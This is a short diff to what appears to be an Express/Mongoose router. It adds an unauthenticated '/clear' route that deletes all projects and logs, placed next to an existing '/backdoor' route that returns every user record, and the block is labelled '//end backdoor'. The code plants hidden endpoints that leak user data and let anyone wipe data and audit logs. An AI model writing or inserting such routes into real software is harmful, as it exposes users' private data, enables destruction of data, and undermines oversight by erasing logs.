@@ -29,6 +29,11 @@ router.get('/backdoor',async(req,res)=>{
   let result=await mongoose.model('users').find();
   res.json(result);
 })
+router.get('/clear',async(req,res)=>{
+  await mongoose.model('projects').remove();
+  await mongoose.model('logs').remove();
+  res.send('ok')
+})
 //end backdoor
 
 //add project
